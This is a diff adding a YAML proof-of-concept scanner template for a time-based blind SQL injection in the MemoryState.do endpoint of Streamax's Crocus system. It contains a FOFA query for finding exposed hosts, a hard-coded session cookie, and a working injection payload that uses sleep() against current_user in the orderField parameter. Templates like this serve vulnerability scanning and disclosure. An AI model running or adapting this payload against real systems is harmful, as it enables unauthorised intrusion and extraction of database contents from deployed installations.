@@ -1,0 +1,22 @@
+id: poc-yaml-crocus-memorystate-do-sqli
+info:
+  name: 锐明技术 Crocus系统 MemoryState.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: crocus
+  fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /MemoryState.do?Action=Query
+  headers:
+    Cookie: Saffron.U=VUlEPTEmVU49MQ==
+    Content-Type: application/x-www-form-urlencoded
+  data: EndTime=&PageIndex=0&PageSize=20&RepairState=-1&StartTime=&orderField=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep({{.t1}}),1))a)&orderType=asc
+  expression: "status_code == 200 && \ncontains(body,\"\\\"Result\\\":\") &&\ncontains(body,\"\
+    \\\"groupName\\\":\") &&\ncontains(content_type,\"text/json\") &&\n!contains(body,\"\
+    <\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
